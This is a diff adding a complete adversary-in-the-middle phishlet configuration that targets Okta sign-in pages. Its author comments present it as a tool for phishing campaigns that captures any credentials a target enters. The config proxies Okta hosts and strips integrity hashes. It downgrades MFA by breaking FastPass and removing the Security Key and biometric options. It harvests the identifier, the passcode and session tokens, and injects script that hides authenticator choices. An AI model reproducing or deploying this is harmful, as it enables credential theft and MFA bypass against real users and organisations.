@@ -1,0 +1,64 @@
+# If you've been sending Okta phishing campaigns, you may have noticed that Okta has been having issues with data capture. I've created a new version of this phishlet that captures any data entered by the target, regardless of whether the credentials are valid. This version is excellent if your goal is to capture credentials and not sessions.
+# Important: check the parameters are being sent in the request to the [endpoint].okta.com site. At the credentials section in this phishlet the values are set to "identifier" and "passcode", but in other cases it could be "username" and "password". and instead of json it could be post.
+author: 'alfiegriver, hydroponictrash, rotarydrone, [and bl4cksku11 as contributor lol]'
+min_ver: '3.3.0'
+redirect_url: 'https://okta.com' # default redirect_url to prevent the infinite reload loop
+proxy_hosts:
+  - {phish_sub: '[target-enpoint-here]', orig_sub: '[target-enpoint-here]', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'ok3static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '', domain: '[target-enpoint-here].okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com',  search: "var baseUrl = '[^']*';" , replace: "var baseUrl = 'https://{hostname}';" , mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/ion+json', 'application/javascript']}
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: '[target-enpoint-here].okta.com', replace: '{hostname}', mimes: ['application/ion+json']}
+  # MFA downgrade: break fastpass polling by rewriting ports array
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: '"ports":\["[^"]*"(?:,"[^"]*")*\]', replace: '"ports":["1"]', mimes: ['application/json', 'application/ion+json']}
+  # MFA downgrade: break com-okta-authenticator callback
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: 'com.okta', replace: 'invalid.okta', mimes: ['application/json', 'application/ion+json']}
+  # MFA downgrade: remove Fastpass option for Okta Verify - handle both possible array positions
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: ',\{"label":"Use Okta FastPass","value":"signed_nonce"\}', replace: '', mimes: ['text/html', 'application/json', 'application/ion+json']}
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: '\{"label":"Use Okta FastPass","value":"signed_nonce"\},', replace: '', mimes: ['text/html', 'application/json', 'application/ion+json']}
+  # MFA downgrade: remove SecurityKey/WebaAuthN options - handle both possible array positions
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: ',\{"label":"Security Key or Biometric".*?"relatesTo":"[^"]*"\}', replace: '', mimes: ['text/html', 'application/json', 'application/ion+json']}
+  - {triggers_on: '[target-enpoint-here].okta.com', orig_sub: '[target-enpoint-here]', domain: 'okta.com', search: '\{"label":"Security Key or Biometric".*?"relatesTo":"[^"]*"\},', replace: '', mimes: ['text/html', 'application/json', 'application/ion+json']}
+auth_tokens:
+  - domain: '[target-enpoint-here].okta.com'
+    keys: ['idx','sid,opt'] # 'idx' if using OIE and factor sequencing, 'sid' if not (default). using opt here means 'optional'. if its there, catch it.
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)"' # '"username":"([^"]*)"'
+    type: 'json' # 'POST'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)"' # '"password":"([^"]*)"'
+    type: 'json' # 'POST'
+login:
+  domain: '[target-enpoint-here].okta.com'
+  path: '/login/login.htm'
+js_inject:
+  - trigger_domains: ['[target-enpoint-here].okta.com', 'login.okta.com']
+    trigger_paths: ['/oauth2/v1/authorize']
+    trigger_params: []
+    script: |
+        let loc = false, hide = false, fill = true;
+        const wait = setInterval(() => {
+          if (!hide || !fill){
+              let opts = document.querySelector('div.authenticator-verify-list.authenticator-list>div>div'),
+              email = document.querySelector('input[name=identifier]'),
+              submit = document.querySelector('input[type=submit]');
+            if (!fill && email && submit) {
+              email.value = '{email}'.split('@')[0];
+              var event = document.createEvent('Event');
+              event.initEvent('change', false, true);
+              email.dispatchEvent(event);
+              submit.click();
+              fill = true;
+            }
+            if (!hide && opts && getComputedStyle(opts).getPropertyValue('display') !== 'none') {
+              opts.style.display = 'none';
+              hide = true;
+            }
+          }
+          if (loc && hide && fill) clearInterval(wait);
+        }, 100);
